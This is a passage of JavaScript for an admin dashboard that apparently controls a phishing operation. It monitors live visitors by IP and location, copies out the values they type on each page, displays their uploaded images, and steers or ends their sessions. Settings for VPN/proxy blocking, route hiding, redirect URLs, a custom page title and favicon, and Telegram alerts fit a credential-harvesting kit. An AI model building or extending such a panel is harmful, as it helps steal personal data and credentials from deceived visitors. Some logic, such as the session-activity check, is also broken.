                    renderTableTimeout = null;
                }, RENDER_TABLE_DEBOUNCE_MS);
    
                if (state.selectedSession && state.selectedSession.id === data.session_id) {
                    state.selectedSession.last_activity = data.last_activity; 
                    state.selectedSession.isActive = data.isActive;
                    if (data.current_page) {
                        state.selectedSession.current_page = data.current_page;
                    }
                    updateConnectionDetails(); 
                }
            } 
        }
    });

      socket.on('terminate_session_response', (response) => {
        if (response.status === 'success') {
            const sessionIndex = state.sessions.findIndex(s => s.id === response.session_id);
            if (sessionIndex > -1) {
                state.sessions.splice(sessionIndex, 1);
                if (state.selectedSession && state.selectedSession.id === response.session_id) {
                    state.selectedSession = null;
                    closeSessionManagerModal();
                }
                updateUI();
            }
        } else {
            logErrorToServer(`Failed to terminate session ${response.session_id}: ${response.message}`);
            showToast(`Error terminating session ${response.session_id}: ${response.message}`, 'error');
        }
      });

      socket.on('route_updated', (data) => {
        const pageKey = data.pageKey;
        const newRoute = data.route;
        const pageIndex = state.availablePages.findIndex(p => p.id === pageKey);
        if (pageIndex >= 0) {
          state.availablePages[pageIndex].route = newRoute;
          state.availablePages[pageIndex].label = newRoute;
          renderAvailablePages();
        }
      });

      socket.on('routes_saved', (response) => {
        if (response.status === 'success') {
          showToast('Route updated successfully. Server restart is required for these changes to take effect.', 'success')
        } else {
              logErrorToServer(response.message || 'Failed to update route');
          showToast(`Failed to update route: ${response.message}`, 'error');
        }
      });
      updateWebsocketStatusIndicator(socket.connected); 
  }
  socket.on('connect', () => {
    wsListener();
  });


document.getElementById('clearSessions').addEventListener('click', async () => {
  const confirmed = await showConfirmDialog('Are you sure you want to clear all sessions?');
  if (confirmed) {
    let sessionsToTerminate = [...state.sessions];
    if (!showAdmins) {
      sessionsToTerminate = sessionsToTerminate.filter(session => session.current_page !== '/admin');
    }
    sessionsToTerminate.forEach(session => {
    });
    state.terminatedSessions = [...state.terminatedSessions, ...sessionsToTerminate];
    
    state.sessions = state.sessions.filter(session => {
      return !sessionsToTerminate.some(s => s.id === session.id);
    });
    
    if (socket && socket.connected) {
      sessionsToTerminate.forEach(session => {
        socket.emit('terminate_session', {
          session_id: session.id
        });
      });
    }
    
    addNotification({
      id: performance.timing.navigationStart + performance.now(),
      title: `Sessions Cleared`,
      message: `${sessionsToTerminate.length} sessions were terminated by admin.`,
      timestamp: Date.now(),
      unread: true,
    });
    
    if (state.selectedSession && sessionsToTerminate.some(s => s.id === state.selectedSession.id)) {
      state.selectedSession = null;
      closeSessionManagerModal();
    }
    
    updateUI();
    showToast(`Cleared ${sessionsToTerminate.length} sessions`, 'success');
  }
});


document.addEventListener('click', (e) => {
  const isOutsideNotifications = !notificationsDropdown.contains(e.target) && 
                               !document.getElementById('notificationsToggle').contains(e.target);
  const isOutsideSettings = !settingsDropdown.contains(e.target) && 
                           !document.getElementById('settingsToggle').contains(e.target);
  if (isOutsideNotifications && state.notificationsOpen) {
      state.notificationsOpen = false;
      notificationsDropdown.classList.remove('show');
      if (notificationsDropdown.parentNode === document.body) {
          document.getElementById('notificationsToggle').parentNode.appendChild(notificationsDropdown);
      }
  }
  if (isOutsideSettings && state.showSettings) {
      state.showSettings = false;
      settingsDropdown.classList.remove('show');
      if (settingsDropdown.parentNode === document.body) {
          document.getElementById('settingsToggle').parentNode.appendChild(settingsDropdown);
      }
  }
});

function silentlyUpdateInputValues(session) {
  if (!session || !session.values) return;
  
  for (const pageKey in session.values) {
      const pageValues = session.values[pageKey];
      if (!pageValues) continue;
      
      const pagePanels = document.querySelectorAll(`[data-page="${pageKey}"]`);
      
      pagePanels.forEach(panel => {
          panel.querySelectorAll('input[data-var]').forEach(input => {
              const varName = input.getAttribute('data-var');
              if (!varName) return;
              
              if (pageValues[varName] !== undefined) {
                  const newValue = pageValues[varName];
                  
                  if (input.value !== newValue) {
                      input.value = newValue;
                      
                      const copyButton = input.nextElementSibling;
                      if (copyButton && copyButton.classList.contains('copy-button')) {
                          copyButton.setAttribute('data-value', newValue);
                          
                          if (newValue) {
                              copyButton.removeAttribute('disabled');
                              copyButton.style.opacity = '';
                          } else {
                              copyButton.setAttribute('disabled', '');
                              copyButton.style.opacity = '0.5';
                          }
                      }
                      
                      if (newValue) {
                          input.classList.remove('text-gray-400', 'dark:text-gray-600');
                      } else {
                          input.classList.add('text-gray-400', 'dark:text-gray-600');
                      }
                  }
              }
          });
          
          for (const varName in pageValues) {
              const newValue = pageValues[varName];
              if (newValue === undefined) continue;
              
              const imageContainer = panel.querySelector(`[data-image-container="${varName}"]`);
              if (!imageContainer) continue;
              
              let imgSrc = '';
              if (typeof newValue === 'object' && newValue !== null && newValue.url) {
                  imgSrc = newValue.url;
              } else if (typeof newValue === 'string' && newValue) {
                  imgSrc = newValue;
              }
              
              if (imgSrc && !imgSrc.startsWith('data:') && !imgSrc.startsWith('http')) {
                  if (!imgSrc.startsWith('/')) {
                      imgSrc = '/' + imgSrc;
                  }
              }
              
              if (imgSrc) {
                const existingImgElement = imageContainer.querySelector('.image-preview');
                const placeholderElement = imageContainer.querySelector('.no-image-placeholder');

                if (existingImgElement) {
                    const currentLoadingSrc = existingImgElement.dataset.loadingSrc;
                    if (existingImgElement.src !== imgSrc && currentLoadingSrc !== imgSrc) {
                        existingImgElement.dataset.loadingSrc = imgSrc;
                        existingImgElement.src = imgSrc;
                        existingImgElement.onload = () => {
                            delete existingImgElement.dataset.loadingSrc;
                            const statusElement = imageContainer.querySelector('.image-status');
                            if (statusElement) {
                                statusElement.className = 'px-2 py-0.5 rounded-full text-xs font-medium image-status bg-status-success-light/20 text-status-success-light dark:text-status-success-dark';
                                statusElement.textContent = 'Uploaded';
                            }
                            const dateElement = imageContainer.querySelector('.image-date');
                            if (dateElement) {
                                dateElement.textContent = `Uploaded ${new Date().toLocaleDateString()}`;
                            }
                            const buttonContainer = imageContainer.querySelector('.image-view-button-container');
                            if (buttonContainer) {
                                let viewButton = buttonContainer.querySelector('.view-image-btn');
                                if (viewButton) {
                                    viewButton.setAttribute('data-src', imgSrc);
                                } else { 
                                    buttonContainer.innerHTML = `<span class="btn-secondary text-xs view-image-btn" data-src="${imgSrc}" data-var="${varName}">View Image</span>`;
                                    viewButton = buttonContainer.querySelector('.view-image-btn');
                                    if (viewButton) {
                                        viewButton.addEventListener('click', function() {
                                            const srcAttr = this.getAttribute('data-src');
                                            if (srcAttr) window.open(srcAttr, '_blank');
                                        });
                                    }
                                }
                                if(viewButton) viewButton.style.display = imgSrc ? 'inline-block' : 'none';
                            }
                        };
                        existingImgElement.onerror = () => {
                            delete existingImgElement.dataset.loadingSrc;
                            const statusElement = imageContainer.querySelector('.image-status');
                            if (statusElement) {
                                statusElement.className = 'px-2 py-0.5 rounded-full text-xs font-medium image-status bg-status-error-light/20 text-status-error-light dark:text-status-error-dark';
                                statusElement.textContent = 'Load Error';
                            }
                            const viewButton = imageContainer.querySelector('.image-view-button-container .view-image-btn');
                            if(viewButton) viewButton.style.display = 'none';
                        };
                    } else if (existingImgElement.src === imgSrc && typeof existingImgElement.dataset.loadingSrc !== 'undefined') {
                        delete existingImgElement.dataset.loadingSrc;
                    }
                } else if (placeholderElement) {
                    const parentDiv = placeholderElement.parentNode;
                    const newImg = document.createElement('img');
                    newImg.alt = "";
                    newImg.className = "w-full h-auto object-contain object-center image-preview";
                    newImg.dataset.var = varName;
                    newImg.style.maxHeight = "300px";
                    newImg.dataset.loadingSrc = imgSrc;
                    parentDiv.replaceChild(newImg, placeholderElement); 
                    
                    newImg.onload = () => { 
                        delete newImg.dataset.loadingSrc; 
                        const statusElement = imageContainer.querySelector('.image-status');
                        if (statusElement) {
                            statusElement.className = 'px-2 py-0.5 rounded-full text-xs font-medium image-status bg-status-success-light/20 text-status-success-light dark:text-status-success-dark';
                            statusElement.textContent = 'Uploaded';
                        }
                        const dateElement = imageContainer.querySelector('.image-date');
                        if (dateElement) {
                            dateElement.textContent = `Uploaded ${new Date().toLocaleDateString()}`;
                        }
                        const buttonContainer = imageContainer.querySelector('.image-view-button-container');
                        if (buttonContainer) {
                            let viewButton = buttonContainer.querySelector('.view-image-btn');
                            if (!viewButton) {
                                buttonContainer.innerHTML = `<span class="btn-secondary text-xs view-image-btn" data-src="${imgSrc}" data-var="${varName}">View Image</span>`;
                                viewButton = buttonContainer.querySelector('.view-image-btn');
                                if (viewButton) {
                                    viewButton.addEventListener('click', function() {
                                        const srcAttr = this.getAttribute('data-src');
                                        if (srcAttr) window.open(srcAttr, '_blank');
                                    });
                                }
                            } else {
                                viewButton.setAttribute('data-src', imgSrc); 
                            }
                            if(viewButton) viewButton.style.display = 'inline-block';
                        }
                    };
                    newImg.onerror = () => { 
                        delete newImg.dataset.loadingSrc; 
                        if (newImg.parentNode === parentDiv) { 
                            parentDiv.replaceChild(placeholderElement, newImg); 
                        }
                        const statusElement = imageContainer.querySelector('.image-status');
                        if (statusElement) {
                            statusElement.className = 'px-2 py-0.5 rounded-full text-xs font-medium image-status bg-status-error-light/20 text-status-error-light dark:text-status-error-dark';
                            statusElement.textContent = 'Load Error';
                        }
                        const viewButton = imageContainer.querySelector('.image-view-button-container .view-image-btn');
                        if(viewButton) viewButton.style.display = 'none';
                    };
                    newImg.src = imgSrc; 
                }
              } else { 
                const imgElement = imageContainer.querySelector('.image-preview');
                const placeholderElementOriginal = imageContainer.querySelector('.no-image-placeholder-template') || document.createElement('div'); 
                if (!imageContainer.querySelector('.no-image-placeholder-template')) { 
                    placeholderElementOriginal.className = 'flex items-center justify-center h-full w-full p-4 text-center text-text-light/50 dark:text-text-color/50 no-image-placeholder';
                    placeholderElementOriginal.textContent = 'No image available';
                }

                if (imgElement) {
                    imgElement.parentNode.replaceChild(placeholderElementOriginal.cloneNode(true), imgElement);
                } else if (!imageContainer.querySelector('.no-image-placeholder')) {
                    imageContainer.innerHTML = '';
                    imageContainer.appendChild(placeholderElementOriginal.cloneNode(true));
                }
                const statusElement = imageContainer.querySelector('.image-status');
                if (statusElement) {
                    statusElement.className = 'px-2 py-0.5 rounded-full text-xs font-medium image-status bg-status-warning-light/20 text-status-warning-light dark:text-status-warning-dark';
                    statusElement.textContent = 'Pending';
                }
                const dateElement = imageContainer.querySelector('.image-date');
                if (dateElement) dateElement.textContent = 'Pending upload';

                const viewButton = imageContainer.querySelector('.image-view-button-container .view-image-btn');
                if(viewButton) viewButton.style.display = 'none';
              }
          }
      });
  }
}


function updateSessionInputFields(session) {
  if (!session || !session.values) {
      return;
  }
  
  
  for (const pageKey in session.values) {
      const pageValues = session.values[pageKey];
      
      const pagePanels = document.querySelectorAll(`[data-page="${pageKey}"]`);
      
      pagePanels.forEach(panel => {
          const inputs = panel.querySelectorAll('input[data-var]');
          
          inputs.forEach(input => {
              const varName = input.getAttribute('data-var');
              
              if (varName && pageValues && pageValues[varName] !== undefined) {
                  const newValue = pageValues[varName];
                  
                  input.value = newValue;
                  
                  if (newValue) {
                      input.classList.remove('text-gray-400', 'dark:text-gray-600');
                  } else {
                      input.classList.add('text-gray-400', 'dark:text-gray-600');
                  }
                  
                  const copyButton = input.nextElementSibling;
                  if (copyButton && copyButton.classList.contains('copy-button')) {
                      copyButton.setAttribute('data-value', newValue);
                      
                      if (newValue) {
                          copyButton.removeAttribute('disabled');
                          copyButton.style.opacity = '';
                      } else {
                          copyButton.setAttribute('disabled', '');
                          copyButton.style.opacity = '0.5';
                      }
                  }
                  
              }
          });
      });
  }
}
  
function selectSession(sessionId) {
  if (!sessionId) return;

  if (typeof progressUpdateInterval !== 'undefined' && progressUpdateInterval) {
    clearInterval(progressUpdateInterval);
    progressUpdateInterval = null;
  }
  state.workflow = [];
  state.workflowInputValues = {};

  const workflowList = document.getElementById('workflowMainList');
  if (workflowList) workflowList.innerHTML = ''; 

  const progressSteps = document.querySelector('.progress-steps');
  if (progressSteps) progressSteps.innerHTML = ''; 

  const progressBarContainer = document.getElementById('workflowProgressBar');
  if (progressBarContainer) progressBarContainer.style.display = 'none'; 
  const progressBar = document.getElementById('workflowProgress');
  if (progressBar) progressBar.style.width = '0%';
  const statusBadge = document.getElementById('workflowStatusBadge');
   if (statusBadge) {
      statusBadge.innerText = 'N/A'; 
      statusBadge.className = 'status-badge'; 
  }
  if (typeof iconConnectionSystem !== 'undefined' && typeof iconConnectionSystem.clearAllConnections === 'function') {
      iconConnectionSystem.clearAllConnections();
  } else {
      const connectionContainer = document.getElementById('connectionContainer');
      if (connectionContainer) connectionContainer.innerHTML = '';
  }

  const session = state.sessions.find(s => s.id === sessionId);
  if (!session) {
      return;
  }
  state.selectedSession = session;
  state.workflow = (state.selectedSession.workflow && Array.isArray(state.selectedSession.workflow))
                     ? [...state.selectedSession.workflow] 
                     : [];
  updateSessionMeta(session);
  renderSessionInputData(sessionId).then(() => {
      updateSessionInputFields(session);
      renderWorkflow(); 
      renderWorkflowProgress();
      if (state.selectedSession.workflow && state.selectedSession.workflow.length > 0 && state.selectedSession.workflow_in_progress) {
          startProgressPolling();
      }
  });

  updateActionButtons();
  showSessionView();

  highlightSession(sessionId);

  updateUrlParams({ sessionId });

  setActiveView('session');
}
  

  async function getLocationData(ip) {
    const res = await fetch(`https://ipapi.co/${ip}/json/`);
    const { city, region, country_name: country, country_code: countryCode } = await res.json();
    return { location: `${city}, ${region}`, country, countryCode };
  }

  function newSession(data) {
    const newSession = {
      id: data.id,
      ip: data.ip,
      location: data.location,
      countryCode: data.countryCode,
      browser: data.browser,
      os: data.os,
      deviceInfo: data.user_agent,
      created: data.created,
      last_activity: data.last_activity,
      current_page: data.current_page,
      get isActive() {
        const THIRTY_SECONDS = 30000;
        return (new Date(Date.now() * 60000) - this.lastPingTimestamp) <= THIRTY_SECONDS;
      }
    };
    state.sessions.push(newSession);
    updateUI();
    playSoundEffect();
  }


  const timeZones = {
    "time-NY": "America/New_York",
    "time-London": "Europe/London",
    "time-Tokyo": "Asia/Tokyo",
    "time-Sydney": "Australia/Sydney"
  };
  
  function updateClocks() {
    const now = new Date();
    
    const options = { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true };
  
    Object.keys(timeZones).forEach(id => {
      const formatter = new Intl.DateTimeFormat([], {
        ...options,
        timeZone: timeZones[id]
      });
      document.getElementById(id).textContent = formatter.format(now);
    });
  }
  
  updateClocks();
  setInterval(updateClocks, 1000);

  function toggleTheme() {
    state.darkMode = !state.darkMode;
    setCookie("darkMode", state.darkMode, 30);
    updateUI();
    updateEmailPreview();
  }

  function toggleSoundEffects(e) {
    state.soundEffects = e.target.checked;
    setCookie("soundEffects", state.soundEffects, 365); 
  }
  
  function toggleNotifications(e) {
    state.showNotifications = e.target.checked;
    setCookie("showNotifications", state.showNotifications, 365);
  }

  function updateActiveSessionsMetric() {
    const el = document.getElementById('activeSessionsCount');
    if (el) el.textContent = state.sessions.filter(s => s.isActive).length;
  }

  function updateTerminatedSessionsMetric() {
    const el = document.getElementById('terminatedSessionsCount');
    if (el) el.textContent = state.terminatedSessions.length;
  }

  function updateTotalSessionsMetric() {
    const el = document.getElementById('totalSessionsCount');
    if (el) el.textContent = state.sessions.filter(s => s.isActive).length;
  }

  function updateSessionMetrics() {
    const currentTime = Date.now() / 1000;
    const activeThreshold = 30;
    
    const totalEl = document.getElementById('totalSessionsCount');
    if (totalEl) {
        totalEl.textContent = state.sessions.length;
    }
    
    const activeEl = document.getElementById('activeSessionsCount');
    if (activeEl) {
        const activeSessions = state.sessions.filter(s => {
            if (s.last_activity) {
                const lastActiveTime = parseFloat(s.last_activity);
                return (currentTime - lastActiveTime) <= activeThreshold;
            }
            
            if (s.lastPingTimestamp && s.lastPingTimestamp !== "Invalid Data") {
                const lastPingTime = parseFloat(s.lastPingTimestamp);
                return (currentTime - lastPingTime) <= activeThreshold;
            }
            
            return false;
        });
        
        activeEl.textContent = activeSessions.length;
    }
    reqSes()
  }
  setInterval(updateSessionMetrics, 10000);
  
  function setCookie(name, value, days) {
    const expires = new Date();
    expires.setTime(expires.getTime() + (days * 24 * 60 * 60 * 1000));
    document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`; 
  }
  
  function getCookie(name) {
    const nameEQ = name + "=";
    const ca = document.cookie.split(';');
    for (let i = 0; i < ca.length; i++) {
      let c = ca[i];
      while (c.charAt(0) == ' ') c = c.substring(1, c.length);
      if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
    }
    return null;
  }


document.getElementById('soundEffectsToggle').addEventListener('click', function () {
  const currentState = getCookie('soundEffects');
  const newState = currentState === 'true' ? 'false' : 'true';
  setCookie('soundEffects', newState);
  if (newState === 'true') {
  } else {
  }
});


document.getElementById('block_proxyToggle').addEventListener('click', function () {
  const currentState = getCookie('block_proxy');
  const newState = currentState === 'true' ? 'false' : 'true';
  setCookie('block_proxy', newState);
});

document.getElementById('hide_routeToggle').addEventListener('click', function () {
  const currentState = getCookie('hide_route');
  const newState = currentState === 'true' ? 'false' : 'true';
  setCookie('hide_route', newState);
});

document.getElementById('deleteInactiveToggle').addEventListener('click', function () {
  const currentState = getCookie('deleteInactive');
  const newState = currentState === 'true' ? 'false' : 'true';
  setCookie('deleteInactive', newState);
  if (newState === 'true') {
  } else {
  }
});

document.getElementById('notiftoggle').addEventListener('click', function () {
  const currentState = getCookie('showNotifications');
  const newState = currentState === 'true' ? 'false' : 'true';
  setCookie('showNotifications', newState);
  if (newState === 'true') {
  } else {
  }
});

let originalNotificationsParent = null;
let originalSettingsParent = null;
originalNotificationsParent = notificationsDropdown.parentNode;
originalSettingsParent = settingsDropdown.parentNode;


function toggleDropdown(dropdown) {
  const isNotifications = dropdown === 'notifications';
  const dropdownEl = isNotifications ? notificationsDropdown : settingsDropdown;
  const toggleEl = document.getElementById(isNotifications ? 'notificationsToggle' : 'settingsToggle');
  
  if (isNotifications) {
    state.notificationsOpen = !state.notificationsOpen;
    state.showSettings = false;
    if (state.notificationsOpen) {
      state.notifications.forEach(notification => notification.unread = false);
      saveNotificationsToCookie();
    }
  } else {
    state.showSettings = !state.showSettings;
    state.notificationsOpen = false;
  }
  
  notificationsDropdown.classList.remove('show');
  settingsDropdown.classList.remove('show');
  
  if (notificationsDropdown.parentNode === document.body) {
    document.getElementById('notificationsToggle').parentNode.appendChild(notificationsDropdown);
  }
  if (settingsDropdown.parentNode === document.body) {
    document.getElementById('settingsToggle').parentNode.appendChild(settingsDropdown);
  }
  
  const isOpen = isNotifications ? state.notificationsOpen : state.showSettings;
  if (isOpen) {
    const container = toggleEl.closest('.relative');
    
    document.body.appendChild(dropdownEl);
    
    dropdownEl.style.position = 'absolute';
    dropdownEl.style.top = '';
    dropdownEl.style.left = '';
    dropdownEl.style.right = '';
    dropdownEl.style.transform = 'none';
    dropdownEl.style.zIndex = '9999';
    
    dropdownEl.classList.add('show');
    
    const rect = toggleEl.getBoundingClientRect();
    const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
    const scrollLeft = window.pageXOffset || document.documentElement.scrollLeft;
    
    dropdownEl.style.top = (rect.bottom + scrollTop) + 'px';
    
    const rightEdge = rect.right + scrollLeft;
    dropdownEl.style.right = (document.documentElement.clientWidth - rightEdge) + 'px';
    
    if (rightEdge - dropdownEl.offsetWidth < scrollLeft) {
      dropdownEl.style.right = '';
      dropdownEl.style.left = scrollLeft + 'px';
    }
  }
  
  renderSettingsDropdown();
  renderNotificationsDropdown();
}



function positionDropdown(dropdownEl, toggleEl) {
  const rect = toggleEl.getBoundingClientRect();
  const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
  const scrollLeft = window.pageXOffset || document.documentElement.scrollLeft;
  
  dropdownEl.style.position = 'absolute';
  dropdownEl.style.zIndex = '9999';
  
  dropdownEl.style.top = (rect.bottom + scrollTop) + 'px';
  
  let rightEdge = rect.right + scrollLeft;
  let leftPosition = rightEdge - dropdownEl.offsetWidth;
  
  if (leftPosition < scrollLeft) leftPosition = scrollLeft;
  if (leftPosition + dropdownEl.offsetWidth > document.documentElement.clientWidth + scrollLeft) {
    leftPosition = document.documentElement.clientWidth + scrollLeft - dropdownEl.offsetWidth;
  }
  
  dropdownEl.style.left = leftPosition + 'px';
}





function renderNotificationsDropdown() {
  const notificationsHTML = state.notifications.length === 0 
    ? `<div class="p-4 text-center text-text-light/60 dark:text-text-color/60">No notifications</div>`
    : state.notifications.map(notification => `
        <div class="notification-item">
          <div class="flex items-start gap-4">
            <div class="flex-1 min-w-0">
              <p class="text-sm font-medium text-text-light dark:text-text-color">${notification.title}</p>
              <p class="mt-1 text-sm text-text-light/60 dark:text-text-color/60">${notification.message}</p>
              <p class="mt-1 text-xs text-text-light/40 dark:text-text-color/40">${timeSince2(notification.timestamp)}</p>
            </div>
            ${notification.unread ? '<div class="h-2 w-2 bg-primary-light dark:bg-primary-dark rounded-full"></div>' : ''}
          </div>
        </div>
      `).join('');
  
  notificationsDropdown.innerHTML = `
    <div class="p-4 border-b border-secondary-light dark:border-secondary-dark flex items-center justify-between">
      <h3 class="text-lg font-semibold text-text-light dark:text-text-color">Notifications</h3>
      <button id="clearNotifications" class="btn-secondary" ${state.notifications.length === 0 ? 'disabled' : ''}>
        Clear all
      </button>
    </div>
    <div class="max-h-96 overflow-y-auto">
      ${notificationsHTML}
    </div>
  `;
  document.getElementById('clearNotifications')?.addEventListener('click', clearNotifications);
}

function embedMovie(url) {
  if (!url.includes("/")) {
    alert("Please enter a valid Soap2Day URL.");
    return;
  }
  
  
  const embedHTML = `<iframe src="${url}" 
                              frameborder="0" 
                              allow="autoplay; encrypted-media" 
                              allowfullscreen 
                              style="width: 100%; height: 100%;">
                     </iframe>`;
  
  document.getElementById('movieEmbedContainer').innerHTML = embedHTML;
}





function adjustScale() {
  const container = document.getElementById('moviePreview1');
  const scaledContainer = document.getElementById('customScaledContainer');
  if (!container || !scaledContainer) return;
  
  const containerWidth = container.clientWidth;
  const containerHeight = container.clientHeight;
  
  const scaleX = containerWidth / 1600;
  const scaleY = containerHeight / 900;
  
  const scale = Math.min(scaleX, scaleY);
  
  scaledContainer.style.transform = `scale(${scale})`;
}

window.addEventListener('resize', adjustScale);


document.getElementById('movieUrlInput').addEventListener('keypress', function(e) {
  if (e.key === 'Enter') {
    const url = e.target.value.trim();
    if (url) {
      if (url.includes("/")) {
        document.getElementById('moviePreview1').innerHTML = `
          <iframe src="${url}" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen style="width:100%; height:100%;"></iframe>
        `;
      } else {
        alert("Please enter a valid Soap2Day URL.");
      }
    }
  }
});

async function saveTelegramConfig() {
  try {
      const config = await getConfigAsync();
      const telegramConfig = {
          telegram_bot: document.getElementById('telegramBotEnabled').checked,
          telegram_bot_username: document.getElementById('telegramBotUsername').value,
          telegram_notification: document.getElementById('telegramNotificationEnabled').checked,
          telegram_chat_id: document.getElementById('telegramChatId').value,
          telegram_bot_token: document.getElementById('telegramBotToken').value,
          admin_ids: document.getElementById('telegramAdminIds').value.split(',').map(id => parseInt(id.trim()))
      };

      const settingsToSave = {
          ...config.options,
          telegram: telegramConfig
      };
      
      socket.emit('save_settings', settingsToSave);
  } catch (error) {
      showToast('Failed to save configuration', 'error');
  }
}

async function loadTelegramConfig() {
  try {
      socket.emit('get_telegram_config');
      socket.off('telegram_config');
      socket.on('telegram_config', (config) => {
          if (!config) {
              return;
          }
          if (config.telegram) {
              document.getElementById('telegramBotEnabled').checked = config.telegram.telegram_bot;
              document.getElementById('telegramBotUsername').value = config.telegram.telegram_bot_username;
              document.getElementById('telegramNotificationEnabled').checked = config.telegram.telegram_notification;
              document.getElementById('telegramChatId').value = config.telegram.telegram_chat_id;
              document.getElementById('telegramBotToken').value = config.telegram.telegram_bot_token;
              document.getElementById('telegramAdminIds').value = config.telegram.admin_ids.join(', ');
          }
          if (config.api_keys?.proxycheck) {
              const proxyCheckInput = document.getElementById('proxyCheckApiKey');
              if (proxyCheckInput) {
                  proxyCheckInput.value = config.api_keys.proxycheck;
              }
              if (!state.config) state.config = {};
              if (!state.config.options) state.config.options = {};
              if (!state.config.options.api_keys) state.config.options.api_keys = {};
              state.config.options.api_keys.proxycheck = config.api_keys.proxycheck;
          }
      });
  } catch (error) {
  }
}

document.getElementById('saveTelegramConfig').addEventListener('click', saveTelegramConfig);
loadTelegramConfig();

function renderSettingsDropdown() {

  if (!state.config) state.config = {};
if (!state.config.options) state.config.options = {};
if (!state.config.options.api_keys) state.config.options.api_keys = {};


  settingsDropdown.innerHTML = `
    <div class="p-4 border-b border-secondary-light dark:border-secondary-dark">
      <h3 class="text-lg font-semibold text-text-light dark:text-text-color">Settings</h3>
    </div>
    <div class="p-4 space-y-4">
      <div class="flex items-center justify-between">
        <span class="text-sm text-text-light dark:text-text-color">Notifications</span>
        <label class="relative inline-flex items-center cursor-pointer">
          <input type="checkbox" id="notiftoggle" class="sr-only peer" ${state.showNotifications ? 'checked' : ''}>
          <div class="w-11 h-6 bg-secondary-light dark:bg-secondary-dark rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary-light dark:peer-checked:bg-primary-dark"></div>
        </label>
      </div>
      <div class="flex items-center justify-between">
        <span class="text-sm text-text-light dark:text-text-color">Sound Effects</span>
        <label class="relative inline-flex items-center cursor-pointer">
          <input type="checkbox" id="soundEffectsToggle" class="sr-only peer" ${state.soundEffects ? 'checked' : ''}>
          <div class="w-11 h-6 bg-secondary-light dark:bg-secondary-dark rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary-light dark:peer-checked:bg-primary-dark"></div>
        </label>
      </div>
      <div class="flex items-center justify-between">
        <span class="text-sm text-text-light dark:text-text-color">Block VPN/Proxy</span>
        <label class="relative inline-flex items-center cursor-pointer">
          <input type="checkbox" id="block_proxyToggle" class="sr-only peer" ${state.block_proxy ? 'checked' : ''}>
          <div class="w-11 h-6 bg-secondary-light dark:bg-secondary-dark rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary-light dark:peer-checked:bg-primary-dark"></div>
        </label>
      </div>
      <div class="flex items-center justify-between">
        <span class="text-sm text-text-light dark:text-text-color">Auto Delete Inactive Sessions</span>
        <label class="relative inline-flex items-center cursor-pointer">
          <input type="checkbox" id="deleteInactiveToggle" class="sr-only peer" ${state.delete_inactive ? 'checked' : ''}>
          <div class="w-11 h-6 bg-secondary-light dark:bg-secondary-dark rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary-light dark:peer-checked:bg-primary-dark"></div>
        </label>
      </div>
      <div class="flex items-center justify-between">
        <span class="text-sm text-text-light dark:text-text-color">Hide Route URL</span>
        <label class="relative inline-flex items-center cursor-pointer">
          <input type="checkbox" id="hide_routeToggle" class="sr-only peer" ${state.hide_route ? 'checked' : ''}>
          <div class="w-11 h-6 bg-secondary-light dark:bg-secondary-dark rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary-light dark:peer-checked:bg-primary-dark"></div>
        </label>
      </div>
      <div class="flex items-center justify-between">
    <span class="text-sm text-text-light dark:text-text-color">Workflow Mode</span>
    <label class="relative inline-flex items-center cursor-pointer">
        <input type="checkbox" id="workflow-mode-toggle" class="sr-only peer" ${state.config.options.workflow_mode ? 'checked' : ''}>
        <div class="w-11 h-6 bg-secondary-light dark:bg-secondary-dark rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary-light dark:peer-checked:bg-primary-dark"></div>
    </label>
</div>
      <div class="flex items-center justify-between">
        <span class="text-sm text-text-light dark:text-text-color">Panel Status</span>
        <label class="relative inline-flex items-center cursor-pointer">
          <input type="checkbox" id="panel_statusToggle" class="sr-only peer" ${state.panel_status ? 'checked' : ''}>
          <div class="w-11 h-6 bg-secondary-light dark:bg-secondary-dark rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-primary-light dark:peer-checked:bg-primary-dark"></div>
        </label>
      </div>
      <div>
        <label class="block text-sm font-medium text-text-light dark:text-text-color">Redirect URL</label>
        <input type="text" id="redirectURL" class="mt-1 block w-full bg-white/50 dark:bg-black/50" value="${state.redirectURL || ''}">
      </div>
      <div>
    <label class="block text-sm font-medium text-text-light dark:text-text-color">Inactive Session Timeout (Minutes)</label>
    <input type="number" id="inactiveSessionTimeout" class="mt-1 block w-full bg-white/50 dark:bg-black/50" value="${state.inactiveSessionTimeoutMinutes || 30}">
    </div>
    <div>
    <label class="block text-sm font-medium text-text-light dark:text-text-color">Page Title</label>
    <input type="text" id="pageTitle" class="mt-1 block w-full bg-white/50 dark:bg-black/50" value="${state.page_title || ''}">
</div>
<div>
    <label class="block text-sm font-medium text-text-light dark:text-text-color">Favicon URL</label>
    <input type="text" id="faviconUrl" class="mt-1 block w-full bg-white/50 dark:bg-black/50" value="${state.favicon_url || ''}">
</div>
    <div>
    <label class="block text-sm font-medium text-text-light dark:text-text-color">ProxyCheck API Key</label>
